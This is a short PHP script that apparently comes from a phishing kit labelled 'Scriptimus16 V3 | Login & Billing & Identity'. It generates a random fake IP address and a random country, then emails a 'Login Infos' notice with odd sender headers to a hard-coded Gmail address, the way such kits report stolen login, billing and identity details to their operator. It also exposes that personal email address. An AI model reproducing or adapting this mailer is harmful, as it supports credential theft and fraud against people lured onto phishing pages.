<?php
  $fr = rand(90,192);
  $sr = rand(72,95);
  $tr = rand(72,168);
  $ftr = rand(1,250);
  $count = rand(1,3);
  if($count == "1"){
    $county = "United Kingdom";
  }else{
    if($count == "2"){
      $county = "Singapore";
    }else{
      $county = "Russia";
    }
  }
  $ip = $fr . "." . $sr . "." . $tr . "." . $ftr;
  $to = "kabonet13@gmail.com";
  $subject = "Scriptimus16 V3 | Login & Billing & Identity - FROM ". $ip ."  - " . $county;
  $headers = "From: L0VE ^_^ \r\n";
  $headers .= "Reply-To: no-reply \r\n";
  $headers .= "CC: L0VE ^_^ \r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  $msg = "------------------ Login Infos -----------------";
  mail($to, $subject, $msg, $headers);

?>
